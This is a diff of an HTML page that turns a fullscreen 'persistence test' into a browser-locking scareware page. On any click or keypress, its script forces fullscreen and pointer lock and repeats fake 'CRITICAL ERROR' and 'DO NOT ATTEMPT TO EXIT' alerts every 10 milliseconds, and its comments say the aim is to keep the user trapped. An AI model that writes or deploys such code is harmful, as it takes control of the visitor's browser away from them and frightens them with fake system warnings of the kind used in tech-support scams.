@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>⚡ UI PERSISTENCE TEST ⚡</title>
+    <title>⚡ UI LOCK ⚡</title>
     <style>
         body { 
-            background: #000; color: #00ff00; 
+            background: #000; color: #0f0; 
             font-family: 'Courier New', monospace; 
             height: 100vh; margin: 0;
             display: flex; align-items: center; justify-content: center;
@@ -14,51 +14,39 @@
     </style>
 </head>
 <body>
-    <div id="status">
-        <h1>[ SYSTEM STABILIZED ]</h1>
-        <p style="text-align:center">Click to engage UI lock.</p>
-    </div>
+    <h1>[ CLICK TO INITIALIZE ]</h1>
 
     <script>
-        function engageLock() {
-            // Update the UI
-            document.getElementById('status').innerHTML = "<h1>LOCK ENGAGED</h1><p>Pressing 'Esc' will re-trigger.</p>";
-
-            // 1. The Persistence Loop
-            // This runs as fast as the monitor refreshes (60Hz+)
-            // It is lightweight (no memory creation) so there is NO LAG.
-            function maintain() {
-                // Constantly asks for fullscreen and mouse lock
-                if (!document.fullscreenElement) {
-                    document.documentElement.requestFullscreen().catch(() => {});
-                }
+        function startSpam() {
+            // 1. Force Fullscreen and Lock Mouse
+            const reLock = () => {
+                document.documentElement.requestFullscreen().catch(() => {});
                 document.body.requestPointerLock();
-                
-                requestAnimationFrame(maintain);
-            }
-
-            // 2. The Interaction Hijack
-            // If the user clicks "OK" on an alert or tries to leave,
-            // we immediately pull them back in.
-            window.onblur = () => {
-                console.log("Focus lost - regaining...");
-                window.focus();
             };
 
-            maintain();
+            // 2. The Pop-up Loop
+            // This waits 10ms after you click "OK" then pops another one.
+            // This keeps the UI responsive but keeps the user trapped.
+            const spam = () => {
+                reLock();
+                alert("⚠ CRITICAL ERROR ⚠\nUNAUTHORIZED INTERACTION DETECTED");
+                alert("⚠ SYSTEM LOCK ⚠\nRE-ESTABLISHING FULLSCREEN MODE");
+                alert("⚠ WARNING ⚠\nDO NOT ATTEMPT TO EXIT");
+                
+                // Triggers the next set of alerts almost immediately
+                setTimeout(spam, 10);
+            };
+
+            spam();
         }
 
-        // Start on first click
-        window.addEventListener('click', engageLock);
+        // Activate on click
+        window.onclick = startSpam;
 
-        // Prevent some keyboard shortcuts from breaking focus
+        // Re-trigger if they try to use keyboard shortcuts
         window.onkeydown = (e) => {
-            // If they try to hit Esc, we refresh the lock
-            if (e.key === "Escape") {
-                setTimeout(engageLock, 10);
-            }
+            startSpam();
         };
     </script>
 </body>
 </html>
-
